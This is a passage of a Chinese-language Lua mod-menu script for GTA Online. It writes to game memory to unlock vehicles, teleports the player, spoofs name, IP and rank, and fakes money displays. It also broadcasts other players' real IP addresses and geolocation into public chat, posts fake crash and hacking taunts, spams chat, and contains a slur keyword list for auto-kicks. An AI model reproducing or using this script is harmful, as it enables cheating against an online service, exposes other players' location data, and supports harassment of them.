		return false
	end
	if ENTITY.IS_ENTITY_IN_AIR(players.user_ped()) then
		return false
	end
	if PED.IS_PED_ON_VEHICLE(players.user_ped()) then
		return false
	end
	return true
end
--即时纳米无人机
function nanodrone()
    local p_bits = memory.script_global(1962996)
	local bits = memory.read_int(p_bits)
	if CanUseDrone() and not BitTest(bits, 24) then
		TASK.CLEAR_PED_TASKS(players.user_ped())
		memory.write_int(p_bits, SetBit(bits, 24))
		if not CanSpawnNanoDrone() then memory.write_int(p_bits, SetBit(bits, 23)) end
	end
end
--请求豪华直升机
function luxuryhelicopter()
	if NETWORK.NETWORK_IS_SESSION_ACTIVE() and
	not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_heli_taxi", -1, true, 0) then
		write_global.int(2793044 + 888, 1)
		write_global.int(2793044 + 895, 1)
	end
end

function DoesPlayerOwnBandito(player)
	if player ~= -1 then
		local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 299)
		return BitTest(memory.read_int(address), 4)
	end
	return false
end

--即时RC匪徒
function bandito()
	write_global.int(2793044 + 6874, 1)
	if not DoesPlayerOwnBandito(players.user()) then
		local address = memory.script_global(1853910 + (players.user() * 862 + 1) + 267 + 299)
		memory.write_int(address, SetBit(memory.read_int(address), 4))
	end
end

function DoesPlayerOwnMinitank(player)
	if player ~= -1 then
		local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 428 + 2)
		return BitTest(memory.read_int(address), 15)
	end
	return false
end

--即时遥控RC坦克
function rctank()
	write_global.int(2793044 + 6875, 1)
	if not DoesPlayerOwnMinitank(players.user()) then
		local address = memory.script_global(1853910 + (players.user() * 862 + 1) + 267 + 428 + 2)
		memory.write_int(address, SetBit(memory.read_int(address), 15))
	end
end
------------------------------------
-----------线上模式传送-------------
------------------------------------
local SEC = ENTITY.SET_ENTITY_COORDS

local ownedprops = {
    {'事务所', 826},
    {'游戏厅', 740},
    {'改车铺', 779},
    {'地堡', 557},
    {'货物仓库', 473},
    {'CEO办公室',   475 },
    {'设施', 590},
    {'机库', 569},
    {'摩托帮会所', 492,
    mcprops = {'摩托帮产业', loc = {
        {'可卡因制造厂', 497 },
        {'假钞伪造厂。', 500 },
        {'证件伪造厂', 498 },
        {'冰毒实验室', 499 },
        {'大麻农场', 496 },
    }}},
    {'夜总会', 614},
    {'车辆仓库', 524}
}

local function getblip(id)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(id)
    while blip ~= 0 do
        local blipColour = HUD.GET_BLIP_COLOUR(blip)
        if HUD.DOES_BLIP_EXIST(blip) and blipColour != 55 and blipColour != 3 then return blip end
        blip = HUD.GET_NEXT_BLIP_INFO_ID(id)
    end
end

local function tpToBlip_teleport(blip)
    local pos = HUD.GET_BLIP_COORDS(blip)
    SEC(players.user_ped(), pos.x, pos.y, pos.z, false, false, false, false)
end

local properties = {}
local function regenerateTpLocations(root)
    for k, _ in pairs(properties) do
        menu.delete(properties[k])
        properties[k] = nil
    end
    for i = 1, #ownedprops do
        local propblip = getblip(ownedprops[i][2])
        if propblip == nil then break end

        properties[ownedprops[i][1]] = menu.action(root, ownedprops[i][1], {}, '', function()
            if not HUD.DOES_BLIP_EXIST(propblip) then
                util.toast('未找到资产')
                return
            end
            tpToBlip_teleport(propblip)
        end)
        if ownedprops[i].mcprops then
            local mcprops = ownedprops[i].mcprops
            local listName = mcprops[1]
            properties[listName] = menu.list(root, listName, {}, '')
            for j = 1, #mcprops.loc do players.user_ped()
                local mcproploc = getblip(mcprops.loc[j][2])
                if propblip == nil then break end

                menu.action(properties[listName], mcprops.loc[j][1], {}, '', function() 
                    if not HUD.DOES_BLIP_EXIST(propblip) then
                        util.toast('未找到资产')
                        return
                    end
                    tpToBlip_teleport(mcproploc)
                end)
            end
        end
    end
end

function tp_prop()
    regenerateTpLocations(Proptp)
end

function tp_aven()
    SEC(players.user_ped(), 514.31335, 4750.5264, -68.99592, false, false, false, false)
end

function tp_kosa()
    local kos = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(760))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(760))
    if kos.x ==0 and kos.y ==0 and kos.z ==0 then
        if set.alert then
            util.toast('未找到虎鲸') 
        end
    else    
        SEC(players.user_ped(), 1561.1543, 385.98312, -49.68535, false, false, false, false)
    end
end

function tp_moc()
    SEC(players.user_ped(), 1103.3782, -3011.6018, -38.999435, false, false, false, false)
end

function tp_terro()
    local ter = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(632))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(632))
    if ter.x == 0 and ter.y == 0 and ter.z == 0 then
        if set.alert then
            util.toast('未找到恐霸')
        end
    else    
        SEC(players.user_ped(), -1421.2347, -3012.9988, -79.04994, false, false, false, false)
    end
end

function tp_scargo()
    local cPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(478))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(478))
        if cPickup.x == 0 and cPickup.y == 0 and cPickup.z == 0 then
            if set.alert then
                util.toast('未找到特殊货物')  
            end
        else
            SEC(players.user_ped(), cPickup.x, cPickup.y, cPickup.z, false, false, false, false)
        end
    end

function tp_vcargo()
    local vPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(523))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(523))
        if vPickup.x == 0 and vPickup.y == 0 and vPickup.z == 0 then
            if set.alert then
                util.toast('未找到载具货物')
            end
        else
            SEC(players.user_ped(), vPickup.x, vPickup.y, vPickup.z, false, false, false, false)
        end
    end

function tp_desk()
    local pcD = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(521))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(521))
        if pcD.x ~= 0 and pcD.y ~= 0 and pcD.z ~= 0 then
            SEC(players.user_ped(), pcD.x- 1.0, pcD.y + 1.0 , pcD.z, false, false, false, false)
        else
        if set.alert then
            util.toast('未找到电脑')  
        end
    end
end

function tp_NCperson()
    local nigh1 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(143))
    local nigh2 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(480))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(143))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(480))
        if nigh1.x ~= 0 and nigh1.y ~= 0 and nigh1.z ~= 0 then
            SEC(players.user_ped(), nigh1.x, nigh1.y, nigh1.z, false, false, false, false)
        elseif nigh2.x ~= 0 and nigh2.y ~= 0 and nigh2.z ~= 0 then
            SEC(players.user_ped(), nigh2.x, nigh2.y, nigh2.z, false, false, false, false)
        else 
            if set.alert then
            util.toast('找不到目标')
            end
        end
    end

function tp_safe()
    local saf1 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(108))
        local saf2 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(207))
        HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(108))
        HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(207))
            if saf1.x ~= 0 and saf1.y ~= 0 and saf1.z ~= 0 then
                SEC(players.user_ped(), saf1.x - 1.0, saf1.y + 1.0 , saf1.z, false, false, false, false)
            elseif saf2.x ~= 0 and saf2.y ~= 0 and saf2.z ~= 0 then
                SEC(players.user_ped(), saf2.x, saf2.y + 1.0 , saf2.z, false, false, false, false)
            else
                if set.alert then
                    util.toast('找不到保险柜')  
                end
            end
        end

function tp_mcproduct()
    local pPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(501))
    local hPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(64))
    local bPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(427))
    local plPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(501))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(64))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(427))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
        if pPickup.x == 0 and pPickup.y == 0 and pPickup.z == 0 then

        elseif pPickup.x ~= 0 and pPickup.y ~= 0 and pPickup.z ~= 0 then
            SEC(players.user_ped(), pPickup.x - 1.5, pPickup.y , pPickup.z, false, false, false, false)
            if set.alert then
                util.toast('传送到摩托帮货物')   
            end
            
        end
        if hPickup.x == 0 and hPickup.y == 0 and hPickup.z == 0 then

        elseif hPickup.x ~= 0 and hPickup.y ~= 0 and hPickup.z ~= 0 then
            SEC(players.user_ped(), hPickup.x- 1.5, hPickup.y, hPickup.z, false, false, false, false)
            if set.alert then
                util.toast('传送到直升机')
            end
        end
        if bPickup.x == 0 and bPickup.y == 0 and bPickup.z == 0 then

        elseif bPickup.x ~= 0 and bPickup.y ~= 0 and bPickup.z ~= 0 then
            SEC(players.user_ped(), bPickup.x, bPickup.y, bPickup.z + 1.0 , false, false, false, false)
            if set.alert then
                util.toast('传送到船')
            end
        end
        if plPickup.x == 0 and plPickup.y == 0 and plPickup.z == 0 then

        elseif plPickup.x ~= 0 and plPickup.y ~= 0 and plPickup.z ~= 0 then
            SEC(players.user_ped(), plPickup.x, plPickup.y + 1.5, plPickup.z - 1, false, false, false, false)
            if set.alert then
                util.toast('传送到飞机')
            end
        else                 
        if set.alert then
            util.toast('未找到摩托帮货物')
        end
    end
end

function tp_bsupplies()
    local sPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(556))
    local dPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(561))
    local fPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(477))
    local plPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(556))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(561))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(477))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
        if sPickup.x == 0 and sPickup.y == 0 and sPickup.z == 0 then
        elseif sPickup.x ~= 0 and sPickup.y ~= 0 and sPickup.z ~= 0 then
            SEC(players.user_ped(), sPickup.x, sPickup.y + 2.0, sPickup.z - 1.0, false, false, false, false)
            if set.alert then
                util.toast('传送到补给品')
            end
        end
        if dPickup.x == 0 and dPickup.y == 0 and dPickup.z == 0 then
        elseif dPickup.x ~= 0 and dPickup.y ~= 0 and dPickup.z ~= 0 then
            SEC(players.user_ped(), dPickup.x, dPickup.y, dPickup.z, false, false, false, false)
            if set.alert then
                util.toast('传送到沙丘FAV')
            end
        end
        if fPickup.x == 0 and fPickup.y == 0 and fPickup.z == 0 then
        elseif fPickup.x ~= 0 and fPickup.y ~= 0 and fPickup.z ~= 0 then
            SEC(players.user_ped(), fPickup.x, fPickup.y, fPickup.z + 1.0 , false, false, false, false)
            if set.alert then
                util.toast('传送到平板拖车')
            end
        else
             if set.alert then
                util.toast('未找到地堡补给品')
             end
        end
    end

function tp_payphone()
    local payPhon = GENERIC_HUD.GET_BLIP_COORDS(GENERIC_HUD.GET_NEXT_BLIP_INFO_ID(817))
    GENERIC_HUD.GET_BLIP_COORDS(GENERIC_HUD.GET_NEXT_BLIP_INFO_ID(817))
        if payPhon.x == 0 and payPhon.y == 0 and payPhon.z == 0 then
            if set.alert then
                util.toast('未找到公共电话亭')
            end
            else
                SEC(players.user_ped(), payPhon.x, payPhon.y, payPhon.z + 1, false, false, false, false)
        end
    end

function tp_eed()
    if GENERIC_HUD.DOES_BLIP_EXIST(GENERIC_HUD.GET_CLOSEST_BLIP_INFO_ID(780)) then
        local eDock = GENERIC_HUD.GET_BLIP_COORDS(GENERIC_HUD.GET_CLOSEST_BLIP_INFO_ID(780))
        if  eDock.x == 0 and eDock.y == 0 and eDock.z == 0
        then
         if set.alert then
         util.toast('未找到出口码头')
        end
         elseif eDock.x ~= 0 and eDock.y ~= 0 and eDock.z ~= 0 then
             PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), 1169.5736, -2971.932, 5.9021106)
         end
     end
end


------------------------------------
-----------线上模式宣布-------------
------------------------------------
function get_best_mug_target()
    local most = 0
    local mostp = 0
    for k,p in pairs(players.list(true, true, true)) do
        cur_wallet = players.get_wallet(p)
        if cur_wallet > most then
            most = cur_wallet
            mostp = p
        end
    end
    if cur_wallet == nil then
        util.toast("你孤单一人。找不到最佳抢劫目标。")
        return
    end
    if most ~= 0 then
        return PLAYER.GET_PLAYER_NAME(mostp) .. " 钱包里的钱最多($" .. most .. ")。 也许去抢劫他们。"
    else
        util.toast("找不到最佳抢劫目标。")
        return nil
    end
end

function get_poorest_player()
    local least = 10000000000000000
    local leastp = 0
    for k,p in pairs(players.list(true, true, true)) do
        cur_assets = players.get_wallet(p) + players.get_bank(p)
        if cur_assets < least then
            least = cur_assets
            leastp = p
        end
    end
    if cur_assets == nil then
        util.toast("你孤单一人。找不到最穷的玩家。")
        return
    end
    if least ~= 10000000000000000 then
        return PLAYER.GET_PLAYER_NAME(leastp) .. " 是本战局中最穷的玩家!(有$" .. players.get_wallet(leastp) .. " 在他们的钱包里$" .. players.get_bank(leastp) .. " 在银行里!)"
    else
        util.toast("找不到最穷的玩家。")
        return nil
    end
end

function get_richest_player()
    local most = 0
    local mostp = 0
    for k,p in pairs(players.list(false, true, true)) do
        cur_assets = players.get_wallet(p) + players.get_bank(p)
        if cur_assets > most then
            most = cur_assets
            mostp = p
        end
    end
    if cur_assets == nil then
        util.toast("你孤单一人。找不到最富的玩家。")
        return
    end
    if most ~= 0 then
        return PLAYER.GET_PLAYER_NAME(mostp) .. " 是本战局中最富的玩家!(有$" .. players.get_wallet(mostp) .. " 在他们的钱包里$" .. players.get_bank(mostp) .. " 在银行里!)"
    else
        util.toast("找不到最富的玩家。")
        return nil
    end
end

function get_lapdances_amount(pid) 
    return memory.read_int(memory.script_global(1853348 + 1 + (pid * 834) + 205 + 55))
end
function get_prostitutes_solicited(pid)
    return memory.read_int(memory.script_global(1853348 + 1 + (pid * 834) + 205 + 54))
end

function get_horniest_player()
    local highest_horniness = 0
    local horniest = 0
    local most_lapdances = 0
    local most_prostitutes = 0
    for k,p in pairs(players.list(true, true, true)) do
        lapdances = get_lapdances_amount(p)
        prostitutes = get_prostitutes_solicited(p)
        horniness = lapdances + prostitutes
        if horniness > highest_horniness then
            highest_horniness = horniness
            horniest = p
            most_lapdances = lapdances
            most_prostitutes = prostitutes
        end
    end
    if horniness == nil then
        util.toast("你孤单一人。找不到最性奋的玩家。")
        return
    end
    if highest_horniness ~= 0 then
        return PLAYER.GET_PLAYER_NAME(horniest) .. " 是战局中最性奋的玩家!他们的角色招来了 " .. most_prostitutes .. " 妓女,并为 " .. most_lapdances .. " 次脱衣舞付钱!"
    else
        util.toast("找不到最性奋的玩家。")
        return nil
    end
end

end_racism = false
end_homophobia = false
function toxicshit(packet_sender, message_sender, text, team_chat)
    text = string.lower(text)
    local name = players.get_name(message_sender)

    if end_racism and (string.contains(text, "nigg") or string.contains(text, "jew")) then 
        menu.trigger_commands("kick " .. name)
        util.toast(name .. " 说了脏话，自动踢了出去")
    end

    if end_homophobia and (string.contains(text, "fag") or string.contains(text, "tranny")) then 
        menu.trigger_commands("kick " .. name)
        util.toast(name .. " 是同性恋，自动踢了出去")
    end
end


------------------------------------
-----------零食护甲编辑-------------
------------------------------------
function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end

function MP_Index()
    local MP_IPTR = memory.alloc(2)
    STATS.STAT_GET_INT(util.joaat("MPPLY_LAST_MP_CHAR"), MP_IPTR, -1)
    return memory.read_int(MP_IPTR)
end

function STAT_SET_INT(Hash, Value)
    if MP_Index() == 0 then 
        STATS.STAT_SET_INT(util.joaat("MP0_"..Hash), Value, true)
    else
        STATS.STAT_SET_INT(util.joaat("MP1_"..Hash), Value, true)
    end
end
------------------------------------
--------线上模式玩乐-----------------
------------------------------------
function Specon(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' on')
    util.yield(3000)
end

function Specoff(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' off')
end
------------------------------------
--------线上模式聊天预设-------------
------------------------------------
local function fake_chat_with_percentage_and_target(action)
    chat.send_message(action .. " ${name}. [||||            ] (25%)", false, true, true)
    util.yield(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||        ] (50%)", false, true, true)
    util.yield(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||    ] (75%)", false, true, true)
    util.yield(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||||| ] (89%)", false, true, true)
    util.yield(math.random(3000, 5000))
end

local function get_random_joke()
    local joke = 'WIP'
    local in_progress = true
    async_http.init('icanhazdadjoke.com', '', function(data)
        joke = data
    end, function()
        joke = 'FAIL'
    end)
    async_http.add_header('Accept', 'text/plain')
    async_http.dispatch()
    while joke == "WIP" do 
        util.yield()
    end
    return joke
end

chat_presets = {
    ["掉钱袋是没用的"] = "我可以给你钱,但你花在上面的时间得到的钱是没有用的。你最好买一份自己的菜单,然后使用其中的恢复选项。",
    ["Paragon天下第一!"] = "Paragon天下第一!",
    ["BaiBaiScript天下第一!"] = "BaiBaiScript天下第一!",
    ["L + Ratio..."] = "L + ratio + u fell off + ur british + who asked + no u + deez nutz + radio + don't care + caught in 4k + cope + seethe + gg + grow the fuck up + silver elite + ligma + taco bell dorito crunch + think outside the bun bitch",
    ["您购买了2take1 "] = "前途无限"
}

function showrealip()
    chat.send_message("${name}: ${ip} | ${geoip.city}, ${geoip.region}, ${geoip.country}", false, true, true)
end

function chatcrash()
    fake_chat_with_percentage_and_target("崩溃")
    chat.send_message("崩溃失败" .. " ${name}. " .. "原因：用你妈免费stand", false, true, true)
end

function ramdomjokelol()
    local joke = get_random_joke()
    if joke ~= "FAIL" then
        chat.send_message(joke, false, true, true)
    end
end

function fakechathacking()
    fake_chat_with_percentage_and_target("黑入")
    chat.send_message("黑入失败" .. " ${name}. " .. "原因：用你妈免费stand", false, true, true)
end

function loopchatjoke()
    if util.is_session_started() then
        local joke = get_random_joke()
        if joke ~= "FAIL" then
            chat.send_message(joke, false, true, true)
        end
        util.yield(5000)
    end
end
------------------------------------
--------线上随机虚假器-------------
------------------------------------
local alphabet = "abcdefghijklmnopqrstuvwxyzABCEDFGHIJKLMNOPQRSTUVWXYZ0123456789"

local function random_string(length)
    local res = {}
    for i=1, length do 
        res[i] = alphabet[math.random(#alphabet)]
    end
    return table.concat(res)
end

local function random_ip_address()
    local ip = {}
    for i=1, 4 do 
            ip[i] = tostring(math.random(1, 255)) 
    end
    return table.concat(ip, '.')
end

local random_name_spoof = false
function ramdomfakename(on)
    random_name_spoof = on
    if on then 
        menu.trigger_commands("spoofedname " .. random_string(16))
    end
end

local random_ip_spoof = false
function ramdomfakeip(on)
    random_ip_spoof = on
    if on then 
        menu.trigger_commands("spoofedip " .. random_ip_address())
    end
end

local random_rank_spoof = false
function ramdomfakelvl(on)
    random_rank_spoof = on
    if on then 
        menu.trigger_commands("spoofedrank " .. math.random(10000))
    end
end

function spamtextname(on)
    menu.trigger_commands("spamtext " .. random_string(254))
    util.yield(100)
end

util.on_transition_finished(function()
    if random_name_spoof then
        menu.trigger_commands("spoofedname " .. random_string(16))
    end
    if random_ip_spoof then
        menu.trigger_commands("spoofedip " .. random_ip_address())
    end
    if random_rank_spoof then
        menu.trigger_commands("spoofedrank " .. math.random(10000))
    end
end)
------------------------------------
---------线上假钱-------------------
------------------------------------
local new = {}
function new.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end
function new.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = new.colour( 255, 255, 255 )}
end
cashFakeMoney = 0
bankFakeMoney = 0
fakeMoneyLoopDelay = new.delay(250, 0, 0)
fakeMoneyTransactionPending = true

function generateDelaySettings(root, name, delayTable)
    menu.slider(root, '毫秒', {'JS'..name..'DelayMs'}, '延迟是毫秒、秒和最小值的总和.', 1, 999, delayTable.ms, 1, function(value)
        delayTable.ms = value
    end)
    menu.slider(root, '秒', {'JS'..name..'DelaySec'}, '延迟是毫秒、秒和最小值的总和.', 0, 59, delayTable.s, 1, function(value)
        delayTable.s = value
    end)
    menu.slider(root, '分钟', {'JS'..name..'DelayMin'}, '延迟是毫秒、秒和最小值的总和.', 0, 60, delayTable.min, 1, function(value)
        delayTable.min = value
    end)
end


local function startBusySpinner(message)
    HUD.BEGIN_TEXT_COMMAND_BUSYSPINNER_ON("STRING")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(message)
    HUD.END_TEXT_COMMAND_BUSYSPINNER_ON(5)
end

local function transactionPending()
    if not fakeMoneyTransactionPending then return end
    startBusySpinner('交易处理中')
    util.yield(math.random(1, 1000))
    HUD.BUSYSPINNER_OFF()
end

function addfakemoney()
    HUD.CHANGE_FAKE_MP_CASH(cashFakeMoney, bankFakeMoney)
    transactionPending()
end

function loopaddfakemoney()
    HUD.CHANGE_FAKE_MP_CASH(cashFakeMoney, bankFakeMoney)
    transactionPending()
    util.yield(getTotalDelay(fakeMoneyLoopDelay))
end

------------------------------------
---------保险箱监视器----------------
------------------------------------
local Int_PTR = memory.alloc_int()

local function getMPX()
    return 'MP'.. util.get_char_slot() ..'_'
end

local function STAT_GET_INT(Stat)
    STATS.STAT_GET_INT(util.joaat(getMPX() .. Stat), Int_PTR, -1)
    return memory.read_int(Int_PTR)
end

local function getNightclubDailyEarnings()
    local popularity = math.floor(STAT_GET_INT('CLUB_POPULARITY') / 10)
    if popularity == 100 then return 50000
    elseif popularity >= 90 then return 45000
    elseif popularity >= 80 then return 24000
    elseif popularity >= 70 then return 22000
    elseif popularity >= 60 then return 20000
    elseif popularity >= 50 then return 9500
    elseif popularity >= 40 then return 8500
    elseif popularity >= 30 then return 2500
    elseif popularity >= 20 then return 2000
    elseif popularity >= 10 then return 1600
    else return 1500
    end
end

local function getAgencyDailyEarnings(securityContracts)
    if securityContracts >= 200 then return 20000 end
    return math.floor(securityContracts / 5) * 500
end

JS_tbls = {}
do
    JS_tbls.alphaPoints = {0, 87, 159, 207, 255}
end

JS_tbls.safeManagerToggles = {
    {
        name = '夜总会保险箱',
        command = 'SMclub',
        description = '监视夜总会保险箱的现金,这不会影响收入.',
        toggle = true,
        displayText = function()
            return '夜总会现金' ..': '.. STAT_GET_INT('CLUB_SAFE_CASH_VALUE')  / 1000  ..'k / 210k'
        end
    },
    {
        name = '夜总会人气',
        command = 'SMclubPopularity',
        description = '',
        toggle = false,
        displayText = function()
            return '夜总会人气' ..': '.. math.floor(STAT_GET_INT('CLUB_POPULARITY') / 10)  ..'%'
        end
    },
    {
        name = '夜总会每日收入',
        command = 'SMnightclubEarnings',
        description = '夜总会每日收入.\n每日最高收入为1万.',
        toggle = false,
        displayText = function()
            return '夜总会每日收入' ..': '.. getNightclubDailyEarnings() / 1000  ..'k / day'
        end
    },
    {
        name = '游戏厅保险箱',
        command = 'SMarcade',
        description = '监视游戏厅保险箱的现金,这不会影响收入.\n如果您拥有所有街机游戏,则每日最高收入为5000.',
        toggle = true,
        displayText = function()
            return '游戏厅现金' ..': '.. STAT_GET_INT('ARCADE_SAFE_CASH_VALUE') / 1000  ..'k / 100k'
        end
    },
    {
        name = '事务所保险箱',
        command = 'SMagency',
        description = '监视事务所保险箱的现金,这不会影响收入.\n每日最高收入为2万.',
        toggle = true,
        displayText = function()
            return '事务所现金' ..': '.. STAT_GET_INT("FIXER_SAFE_CASH_VALUE") / 1000  ..'k / 250k'
        end
    },
    {
        name = '安保合约',
        command = 'SMsecurity',
        description = '显示您已完成的事务所安保合约的任务数量.',
        toggle = false,
        displayText = function()
            return '安保合约' ..': '.. STAT_GET_INT('FIXER_COUNT')
        end
    },
    {
        name = '事务所每日收入',
        command = 'SMagencyEarnings',
        description = '事务所每日收入.\n如果您已完成200份合约,则每日最高收入为2万',
        toggle = false,
        displayText = function()
            return '事务所每日收入' ..': '.. getAgencyDailyEarnings(STAT_GET_INT('FIXER_COUNT')) / 1000 ..'k / day'
        end
    },
}

function generateHudSettings(root, prefix, settingsTable)
    menu.slider(root, 'X 位置', {prefix..'XPos'}, '', -200, 0, settingsTable.xOffset, 1, function(value)
        settingsTable.xOffset = value
    end)
    menu.slider(root, 'Y 位置', {prefix..'YPos'}, '', -5, 195, settingsTable.yOffset, 1, function(value)
        settingsTable.yOffset = value
    end)
    menu.slider(root, '比例', {prefix..'scale'}, '文字大小', 200, 1500, 500, 1, function(value)
        settingsTable.scale = value / 1000
    end)
    menu.slider(root, '文本对齐', {prefix..'alignment'}, '1居中,2居左,3居右.', 1, 3, settingsTable.alignment, 1, function(value)
        settingsTable.alignment = value
    end)
    menu.colour(root, '文本颜色', {prefix..'colour'}, '设置文本覆盖的颜色.', settingsTable.textColour, true, function(colour)
        settingsTable.textColour = colour
    end)
end

function generateToggles(table, root, reversed)
    for i = 1, #table do
        if not reversed then
            menu.toggle(root, table[i].name, {table[i].command}, table[i].description, function(toggle)
                table[i].toggle = toggle
            end, table[i].toggle)
        else
            menu.toggle(root, table[i].name, {table[i].command}, table[i].description, function(toggle)
                table[i].toggle = not toggle
            end, not table[i].toggle)
        end
    end
end
------------------------------------
---------赌场-----------------------
------------------------------------
local function STAT_GET_INT_MPPLY(Stat)
    STATS.STAT_GET_INT(util.joaat(Stat), Int_PTR, -1)
    return memory.read_int(Int_PTR)
end

local last_LW_seconds = 0
function casinolucky()
    if STAT_GET_INT_MPPLY('mpply_lucky_wheel_usage') < util.current_unix_time_seconds() then util.toast('幸运转盘目前可用') return end
    local secondsLeft = STAT_GET_INT_MPPLY('mpply_lucky_wheel_usage') - util.current_unix_time_seconds()
    local hours = math.floor(secondsLeft / 3600)
    local minutes = math.floor((secondsLeft / 60) % 60)
    local seconds = secondsLeft % 60
    if last_LW_seconds != seconds then
        util.toast((hours < 10 and ('0'.. hours) or hours) ..':'.. (minutes < 10 and ('0'.. minutes) or minutes) ..':'.. (seconds < 10 and ('0'.. seconds) or seconds))
        last_LW_seconds = seconds
    end
end

function casinolp()
    local chips = STAT_GET_INT_MPPLY('mpply_casino_chips_won_gd')
    if chips > 0 then
        util.toast('您赢了' ..' '.. chips ..' '.. '筹码')
    elseif chips < 0 then
        util.toast('您输了' ..' '.. chips * -1 ..' '.. '筹码')
    else
        util.toast('您还没有赢或输任何筹码.')
    end
end
------------------------------------
-----------时间挑战赛---------------
------------------------------------
local function ttTimeToString(time)
    local min = math.floor(time / 60000)
    local sec = (time % 60000) / 1000
    return (min == 0 and '' or min ..'min ') .. sec ..'s'
end

local function tpToBlip(blip)
local pos = HUD.GET_BLIP_COORDS(blip)
local tpEntity = (PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) and my_cur_car or players.user_ped())
ENTITY.SET_ENTITY_COORDS(tpEntity, pos.x, pos.y, pos.z, false, false, false, false)
end

function besttime()
    util.toast('个人最佳记录' ..': '.. ttTimeToString((STAT_GET_INT_MPPLY('mpply_timetrialbesttime'))))
    util.yield(100)
end

function tptotime()
    local ttBlip = HUD.GET_CLOSEST_BLIP_INFO_ID(430)
    if not HUD.DOES_BLIP_EXIST(ttBlip) then
        util.toast('Couldn\'t find time trial.')
        return
    end
    tpToBlip(ttBlip)
end

function bestrctime()
    util.toast('个人最佳记录' ..': '.. ttTimeToString(STAT_GET_INT_MPPLY('mpply_rcttbesttime')))
    util.yield(100)
end

function tptorctime()
    local ttBlip = HUD.GET_CLOSEST_BLIP_INFO_ID(673)
    if not HUD.DOES_BLIP_EXIST(ttBlip) then
        util.toast('未能找到RC匪徒时间挑战赛')
        return
    end
    tpToBlip(ttBlip)
end
------------------------------------
-----------阻挡区域-----------------
------------------------------------   


local notifications = true
local blockInProgress = false
function blockAvailable(areaBlocked, areaName)
    if blockInProgress then util.toast('一个阻挡已经在运行') return false end
    if areaBlocked then util.toast(areaName ..' '.. '已被阻挡') return false end
    return true
end

function setBlockStatus(on, areaName)
    if on then
        blockInProgress = true
        startBusySpinner('阻挡中')
        return
    end
    HUD.BUSYSPINNER_OFF()
    if notifications then util.toast('已成功阻挡' ..' '.. areaName ..'.') end
    blockInProgress = false
end

function blocksomewhere()
    local dir = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 5.0, 0)
    GRAPHICS.DRAW_MARKER_SPHERE(dir.x, dir.y, dir.z, 0.3, 52, 144, 233, 0.5)
    if JSkey.is_key_down('VK_B') then
        if blockInProgress then util.toast('一个阻挡已经在运行') return end
        setBlockStatus(true)
        block({dir.x, dir.y, dir.z - 0.6})
        setBlockStatus(false, '区域')
    end
end

function netItAll(entity)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) do
